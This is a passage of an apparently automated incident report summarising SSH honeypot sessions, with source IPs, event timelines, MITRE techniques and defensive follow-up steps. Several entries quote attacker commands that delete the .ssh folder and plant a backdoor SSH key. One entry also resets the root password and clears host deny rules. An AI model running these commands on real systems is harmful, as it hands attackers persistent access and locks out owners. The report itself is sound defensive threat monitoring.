| `2026-06-09 06:22:06` | `cowrie.command.input` |
| `2026-06-09 06:22:06` | `cowrie.command.failed` |
| `2026-06-09 06:22:07` | `cowrie.log.closed` |
| `2026-06-09 06:22:07` | `cowrie.session.params` |
| `2026-06-09 06:22:07` | `cowrie.command.input` |
| `2026-06-09 06:22:07` | `cowrie.session.file_download` |
| `2026-06-09 06:22:07` | `cowrie.log.closed` |
| `2026-06-09 06:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23107f0b0579

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:22 |
| **Last Seen** | 2026-06-09 06:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:22:10` | `cowrie.session.connect` |
| `2026-06-09 06:22:10` | `cowrie.client.version` |
| `2026-06-09 06:22:10` | `cowrie.client.kex` |
| `2026-06-09 06:22:11` | `cowrie.login.success` |
| `2026-06-09 06:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e108d0f07226

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:23 |
| **Last Seen** | 2026-06-09 06:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:23:57` | `cowrie.session.connect` |
| `2026-06-09 06:23:57` | `cowrie.client.version` |
| `2026-06-09 06:23:57` | `cowrie.client.kex` |
| `2026-06-09 06:23:58` | `cowrie.login.success` |
| `2026-06-09 06:23:59` | `cowrie.session.params` |
| `2026-06-09 06:23:59` | `cowrie.command.input` |
| `2026-06-09 06:23:59` | `cowrie.command.failed` |
| `2026-06-09 06:24:00` | `cowrie.log.closed` |
| `2026-06-09 06:24:00` | `cowrie.session.params` |
| `2026-06-09 06:24:00` | `cowrie.command.input` |
| `2026-06-09 06:24:00` | `cowrie.session.file_download` |
| `2026-06-09 06:24:00` | `cowrie.log.closed` |
| `2026-06-09 06:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703303a8181d

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:24 |
| **Last Seen** | 2026-06-09 06:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:24:03` | `cowrie.session.connect` |
| `2026-06-09 06:24:03` | `cowrie.client.version` |
| `2026-06-09 06:24:03` | `cowrie.client.kex` |
| `2026-06-09 06:24:04` | `cowrie.login.success` |
| `2026-06-09 06:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90bec5e35b3

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:25 |
| **Last Seen** | 2026-06-09 06:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:25:49` | `cowrie.session.connect` |
| `2026-06-09 06:25:49` | `cowrie.client.version` |
| `2026-06-09 06:25:49` | `cowrie.client.kex` |
| `2026-06-09 06:25:50` | `cowrie.login.success` |
| `2026-06-09 06:25:51` | `cowrie.session.params` |
| `2026-06-09 06:25:51` | `cowrie.command.input` |
| `2026-06-09 06:25:51` | `cowrie.command.failed` |
| `2026-06-09 06:25:51` | `cowrie.log.closed` |
| `2026-06-09 06:25:51` | `cowrie.session.params` |
| `2026-06-09 06:25:51` | `cowrie.command.input` |
| `2026-06-09 06:25:52` | `cowrie.session.file_download` |
| `2026-06-09 06:25:52` | `cowrie.log.closed` |
| `2026-06-09 06:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-275b6f127280

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:25 |
| **Last Seen** | 2026-06-09 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:25:55` | `cowrie.session.connect` |
| `2026-06-09 06:25:55` | `cowrie.client.version` |
| `2026-06-09 06:25:55` | `cowrie.client.kex` |
| `2026-06-09 06:25:56` | `cowrie.login.success` |
| `2026-06-09 06:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1763b716d3db

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:26 |
| **Last Seen** | 2026-06-09 06:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:26:43` | `cowrie.session.connect` |
| `2026-06-09 06:26:43` | `cowrie.client.version` |
| `2026-06-09 06:26:43` | `cowrie.client.kex` |
| `2026-06-09 06:26:43` | `cowrie.login.success` |
| `2026-06-09 06:26:43` | `cowrie.session.params` |
| `2026-06-09 06:26:43` | `cowrie.command.input` |
| `2026-06-09 06:26:43` | `cowrie.command.failed` |
| `2026-06-09 06:26:43` | `cowrie.log.closed` |
| `2026-06-09 06:26:43` | `cowrie.session.params` |
| `2026-06-09 06:26:43` | `cowrie.command.input` |
| `2026-06-09 06:26:43` | `cowrie.session.file_download` |
| `2026-06-09 06:26:43` | `cowrie.log.closed` |
| `2026-06-09 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20311e5fec3b

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:26 |
| **Last Seen** | 2026-06-09 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:26:45` | `cowrie.session.connect` |
| `2026-06-09 06:26:45` | `cowrie.client.version` |
| `2026-06-09 06:26:45` | `cowrie.client.kex` |
| `2026-06-09 06:26:45` | `cowrie.login.success` |
| `2026-06-09 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dfd2aef9c12

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:28 |
| **Last Seen** | 2026-06-09 06:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:28:32` | `cowrie.session.connect` |
| `2026-06-09 06:28:32` | `cowrie.client.version` |
| `2026-06-09 06:28:32` | `cowrie.client.kex` |
| `2026-06-09 06:28:33` | `cowrie.login.success` |
| `2026-06-09 06:28:33` | `cowrie.session.params` |
| `2026-06-09 06:28:33` | `cowrie.command.input` |
| `2026-06-09 06:28:33` | `cowrie.command.failed` |
| `2026-06-09 06:28:34` | `cowrie.log.closed` |
| `2026-06-09 06:28:34` | `cowrie.session.params` |
| `2026-06-09 06:28:34` | `cowrie.command.input` |
| `2026-06-09 06:28:34` | `cowrie.session.file_download` |
| `2026-06-09 06:28:34` | `cowrie.log.closed` |
| `2026-06-09 06:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41acdc361040

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:28 |
| **Last Seen** | 2026-06-09 06:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:28:37` | `cowrie.session.connect` |
| `2026-06-09 06:28:37` | `cowrie.client.version` |
| `2026-06-09 06:28:38` | `cowrie.client.kex` |
| `2026-06-09 06:28:39` | `cowrie.login.success` |
| `2026-06-09 06:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28521ca4dcfc

| Field | Detail |
|---|---|
| **Source IP** | `117.80.226[.]34` |
| **First Seen** | 2026-06-09 06:32 |
| **Last Seen** | 2026-06-09 06:32 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xFhzDhIJwkBF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:32:05` | `cowrie.session.connect` |
| `2026-06-09 06:32:05` | `cowrie.client.version` |
| `2026-06-09 06:32:05` | `cowrie.client.kex` |
| `2026-06-09 06:32:09` | `cowrie.login.success` |
| `2026-06-09 06:32:11` | `cowrie.session.params` |
| `2026-06-09 06:32:11` | `cowrie.command.input` |
| `2026-06-09 06:32:11` | `cowrie.command.failed` |
| `2026-06-09 06:32:11` | `cowrie.log.closed` |
| `2026-06-09 06:32:12` | `cowrie.session.params` |
| `2026-06-09 06:32:12` | `cowrie.command.input` |
| `2026-06-09 06:32:12` | `cowrie.session.file_download` |
| `2026-06-09 06:32:12` | `cowrie.log.closed` |
| `2026-06-09 06:32:32` | `cowrie.session.params` |
| `2026-06-09 06:32:32` | `cowrie.command.input` |
| `2026-06-09 06:32:33` | `cowrie.log.closed` |
| `2026-06-09 06:32:33` | `cowrie.session.params` |
| `2026-06-09 06:32:33` | `cowrie.command.input` |
| `2026-06-09 06:32:34` | `cowrie.log.closed` |
| `2026-06-09 06:32:34` | `cowrie.session.params` |
| `2026-06-09 06:32:34` | `cowrie.command.input` |
| `2026-06-09 06:32:34` | `cowrie.session.file_download` |
| `2026-06-09 06:32:34` | `cowrie.log.closed` |
| `2026-06-09 06:32:35` | `cowrie.session.params` |
| `2026-06-09 06:32:35` | `cowrie.command.input` |
| `2026-06-09 06:32:36` | `cowrie.log.closed` |
| `2026-06-09 06:32:36` | `cowrie.session.params` |
| `2026-06-09 06:32:36` | `cowrie.command.input` |
| `2026-06-09 06:32:36` | `cowrie.log.closed` |
| `2026-06-09 06:32:37` | `cowrie.session.params` |
| `2026-06-09 06:32:37` | `cowrie.command.input` |
| `2026-06-09 06:32:37` | `cowrie.command.input` |
| `2026-06-09 06:32:37` | `cowrie.log.closed` |
| `2026-06-09 06:32:38` | `cowrie.session.params` |
| `2026-06-09 06:32:38` | `cowrie.command.input` |
| `2026-06-09 06:32:38` | `cowrie.log.closed` |
| `2026-06-09 06:32:39` | `cowrie.session.params` |
| `2026-06-09 06:32:39` | `cowrie.command.input` |
| `2026-06-09 06:32:39` | `cowrie.log.closed` |
| `2026-06-09 06:32:39` | `cowrie.session.params` |
| `2026-06-09 06:32:39` | `cowrie.command.input` |
| `2026-06-09 06:32:40` | `cowrie.log.closed` |
| `2026-06-09 06:32:42` | `cowrie.session.params` |
| `2026-06-09 06:32:42` | `cowrie.command.input` |
| `2026-06-09 06:32:43` | `cowrie.log.closed` |
| `2026-06-09 06:32:44` | `cowrie.session.params` |
| `2026-06-09 06:32:44` | `cowrie.command.input` |
| `2026-06-09 06:32:44` | `cowrie.log.closed` |
| `2026-06-09 06:32:44` | `cowrie.session.params` |
| `2026-06-09 06:32:44` | `cowrie.command.input` |
| `2026-06-09 06:32:45` | `cowrie.log.closed` |
| `2026-06-09 06:32:46` | `cowrie.session.params` |
| `2026-06-09 06:32:46` | `cowrie.command.input` |
| `2026-06-09 06:32:46` | `cowrie.log.closed` |
| `2026-06-09 06:32:47` | `cowrie.session.params` |
| `2026-06-09 06:32:47` | `cowrie.command.input` |
| `2026-06-09 06:32:47` | `cowrie.log.closed` |
| `2026-06-09 06:32:48` | `cowrie.session.params` |
| `2026-06-09 06:32:48` | `cowrie.command.input` |
| `2026-06-09 06:32:48` | `cowrie.log.closed` |
| `2026-06-09 06:32:49` | `cowrie.session.params` |
| `2026-06-09 06:32:49` | `cowrie.command.input` |
| `2026-06-09 06:32:49` | `cowrie.log.closed` |
| `2026-06-09 06:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.80.226[.]34` to AbuseIPDB if not already reported
- [ ] Block `117.80.226[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0ca7a8d33e

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:34 |
| **Last Seen** | 2026-06-09 06:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:34:54` | `cowrie.session.connect` |
| `2026-06-09 06:34:54` | `cowrie.client.version` |
| `2026-06-09 06:34:54` | `cowrie.client.kex` |
| `2026-06-09 06:34:54` | `cowrie.login.success` |
| `2026-06-09 06:34:54` | `cowrie.session.params` |
| `2026-06-09 06:34:54` | `cowrie.command.input` |
| `2026-06-09 06:34:54` | `cowrie.command.failed` |
| `2026-06-09 06:34:54` | `cowrie.log.closed` |
| `2026-06-09 06:34:54` | `cowrie.session.params` |
| `2026-06-09 06:34:54` | `cowrie.command.input` |
| `2026-06-09 06:34:54` | `cowrie.session.file_download` |
| `2026-06-09 06:34:54` | `cowrie.log.closed` |
| `2026-06-09 06:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9e52c1de88

| Field | Detail |
|---|---|
| **Source IP** | `103.38.219[.]22` |
| **First Seen** | 2026-06-09 06:34 |
| **Last Seen** | 2026-06-09 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:34:56` | `cowrie.session.connect` |
| `2026-06-09 06:34:56` | `cowrie.client.version` |
| `2026-06-09 06:34:56` | `cowrie.client.kex` |
| `2026-06-09 06:34:56` | `cowrie.login.success` |
| `2026-06-09 06:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.38.219[.]22` to AbuseIPDB if not already reported
- [ ] Block `103.38.219[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b21abf433b23

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:39 |
| **Last Seen** | 2026-06-09 06:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:39:44` | `cowrie.session.connect` |
| `2026-06-09 06:39:44` | `cowrie.client.version` |
| `2026-06-09 06:39:44` | `cowrie.client.kex` |
| `2026-06-09 06:39:45` | `cowrie.login.success` |
| `2026-06-09 06:39:46` | `cowrie.session.params` |
| `2026-06-09 06:39:46` | `cowrie.command.input` |
| `2026-06-09 06:39:46` | `cowrie.command.failed` |
| `2026-06-09 06:39:47` | `cowrie.log.closed` |
| `2026-06-09 06:39:47` | `cowrie.session.params` |
| `2026-06-09 06:39:47` | `cowrie.command.input` |
| `2026-06-09 06:39:47` | `cowrie.session.file_download` |
| `2026-06-09 06:39:47` | `cowrie.log.closed` |
| `2026-06-09 06:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a7febbb5d6

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-09 06:39 |
| **Last Seen** | 2026-06-09 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 06:39:50` | `cowrie.session.connect` |
| `2026-06-09 06:39:50` | `cowrie.client.version` |
| `2026-06-09 06:39:50` | `cowrie.client.kex` |
| `2026-06-09 06:39:51` | `cowrie.login.success` |
| `2026-06-09 06:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5f2fc525363

| Field | Detail |
|---|---|
| **Source IP** | `117.80.226[.]34` |
| **First Seen** | 2026-06-09 06:39 |
| **Last Seen** | 2026-06-09 06:40 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
